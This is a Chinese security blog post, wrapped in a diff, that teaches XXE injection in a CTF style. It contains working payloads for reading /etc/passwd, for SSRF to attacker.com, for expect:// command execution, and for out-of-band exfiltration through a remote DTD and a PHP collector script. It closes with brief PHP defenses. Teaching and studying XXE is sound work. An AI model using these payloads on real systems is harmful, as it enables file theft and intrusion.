@@ -1,0 +1,242 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>XXE 2024-7-10 · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2024-07-10">2024年7月10日</time>
+        
+        
+          <span class="post__readtime">7 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/xxe/">#xxe</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">XXE 2024-7-10</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <h1 id="什么是XXE？"><a href="#什么是XXE？" class="headerlink" title="什么是XXE？"></a>什么是XXE？</h1><p>XXE 全称XML外部实体注入(XML External Entity Injection)攻击。是由于程序在解析XML时加载了攻击者伪造的外部实体引发的安全问题。</p>
+<h1 id="什么是XML？"><a href="#什么是XML？" class="headerlink" title="什么是XML？"></a>什么是XML？</h1><p>XML指的是可扩展标记语言(e<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage)类似于html。不过HTML则用来显示数据，而XML被设计用来传输和存储数据，是一种文本格式。</p>
+<h2 id="XML的特点"><a href="#XML的特点" class="headerlink" title="XML的特点"></a>XML的特点</h2><ol>
+<li>XML的标签没有被定义，需要使用者自己自定义标签和文档结构</li>
+<li>XML仅仅是纯文本，不会做任何事情。仅仅是用来存储数据</li>
+</ol>
+<h2 id="XML文本格式"><a href="#XML文本格式" class="headerlink" title="XML文本格式"></a>XML文本格式</h2><ul>
+<li>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</li>
+</ul>
+<p><img src="/../../img/Typora/image-20240710181408971.png" alt="image-20240710181408971"></p>
+<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><ul>
+<li>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</li>
+</ul>
+<h4 id="为什么要使用DTD？"><a href="#为什么要使用DTD？" class="headerlink" title="为什么要使用DTD？"></a>为什么要使用DTD？</h4><ol>
+<li>通过DTD每一个XML文档都可以拥有一个有关对自身格式的描述。</li>
+<li>可以通过DTD来规定一个XML文档的标准格式，某些需要直接交换数据的XML文档通过使用这个DTD来确保格式相同，避免数据解析错误。</li>
+<li>应用程序在接收到XML文档时，可以使用DTD进行验证，若符合DTD的定义，则表示应用程序可以安全的处理这些数据。</li>
+<li>DTD还可以用来对自身生成的XML进行验证。</li>
+</ol>
+<h3 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h3><ul>
+<li>实体可在内部或外部进行声明。</li>
+</ul>
+<p><strong>内部实体的声明:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>示例:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE example [</span><br><span class="line">        &lt;!ENTITY greeting &quot;Hello, world!&quot;&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">    &lt;to&gt;&amp;greeting;&lt;/to&gt;   //&lt;to&gt;&lt;/to&gt;标签中的  &amp;greeting; 将会被解析成Hello, world!</span><br><span class="line">    &lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">    &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">    &lt;body&gt; Don&#x27;t forget me this weekend!&lt;/body&gt;</span><br><span class="line">    &lt;website&gt;&lt;/website&gt;	</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>外部实体的声明:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>示例1:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flag.txt中存放的内容是 Yliken</span><br><span class="line"></span><br><span class="line">XML文档</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">        &lt;!ENTITY b SYSTEM &quot;file:///D:/flag.txt&quot;&gt;     //  b =&gt; Yliken </span><br><span class="line">        ]&gt;</span><br><span class="line"></span><br><span class="line">&lt;author&gt;&amp;writer;&lt;/author&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="既然XML是纯文本，那么为什么还会产生注入攻击？"><a href="#既然XML是纯文本，那么为什么还会产生注入攻击？" class="headerlink" title="既然XML是纯文本，那么为什么还会产生注入攻击？"></a>既然XML是纯文本，那么为什么还会产生注入攻击？</h2><p>XML是纯文本格式，本身是不会有任何作用。XXE攻击利用的是编程语言中对XML文本进行解析的函数处理外部实体的能力。通过构造恶意的XML使解析器访问本地或者网络上的资源。</p>
+<h2 id="XML外部实体攻击"><a href="#XML外部实体攻击" class="headerlink" title="XML外部实体攻击"></a>XML外部实体攻击</h2><p>XML外部实体攻击就是XXE。 XML文档中DTD实体中的SYSTEM关键字会令XML解析器中读取内容，并允许它在XML中被替换。攻击者通过构造恶意DTD实体来强制让XML文档解析器去访问指定资源(既可以是本地文件也可以是远程文件)。来达到攻击的目的。</p>
+<h1 id="有回显XXE利用"><a href="#有回显XXE利用" class="headerlink" title="有回显XXE利用"></a>有回显XXE利用</h1><ol>
+<li><p>文件读取：构造带有恶意的DTD外部实体的XML，通过<code>file://</code>、  <code>php://</code>等伪协议来进行文件读取。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>SSRF: 构造带有恶意的DTD外部实体的XML，指向想要请求的资源。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE example [</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;http://attacker.com/ssrf?data=internal&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;example&gt;</span><br><span class="line">  &amp;xxe;</span><br><span class="line">&lt;/example&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>RCE: 如果PHP的 expect模块被加载到web应用上。可以通过恶意的DTD来实现命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;</span><br><span class="line">&lt;catalog&gt;</span><br><span class="line">      &lt;description&gt;&amp;xxe;&lt;/description&gt;</span><br><span class="line">&lt;/catalog&gt;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="无回显XXE利用"><a href="#无回显XXE利用" class="headerlink" title="无回显XXE利用"></a>无回显XXE利用</h1><p>很多时候后端解析了XML文档并不会有输出。这样可以通外带数据进行利用(OOB)。</p>
+<p>利用思路与打XSS思路相同：</p>
+<ol>
+<li>我们需要有一个接收平台</li>
+<li>把后端将XML解析后读取的数据 发送到 接收平台</li>
+<li>接收平台进行数据的存储</li>
+<li>去接收平台查看</li>
+</ol>
+<p>做法：</p>
+<ol>
+<li><p>先读取想要的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>调用一个放在接收平台的外部<code>xml</code>。比如<code>1.xml</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://example/1.xml&quot;&gt; </span><br></pre></td></tr></table></figure>
+
+<p><code>1.xml</code>的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">	&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://example/2.php?id=%file;&#x27;&gt;&quot;</span><br><span class="line">	 &gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>1.xml</code>访问接收平台上的<code>2.php</code>。<code>2.php</code>接收<code>%file</code> 也就是 读取到的文件内容</p>
+<p><code>2.php</code>的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&quot;id&quot;],FILE_APPEND);?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>2.php</code>将读取到的文件的内容存储到3.txt中</p>
+</li>
+</ol>
+<h1 id="PHP中XXE的防御"><a href="#PHP中XXE的防御" class="headerlink" title="PHP中XXE的防御"></a>PHP中XXE的防御</h1><ol>
+<li>通过<code>libxml_disable_entity_loader(true)</code>禁止使用外部实体</li>
+<li>过滤掉用户提交的XML数据中的<code>SYSTEM</code>和<code>PUBLIC</code></li>
+</ol>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-03-06">2024·03·06</time>
+          <a class="related__link" href="/2024/03/06/%E5%9F%BA%E7%A1%80/XXE/">浅学XXE</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2024/07/11/%E5%9F%BA%E7%A1%80/RCE%E9%A2%98%E7%9B%AE/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">RCE</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2024/07/01/Golang/Golang%E5%9F%BA%E7%A1%80/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">Golang基础</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
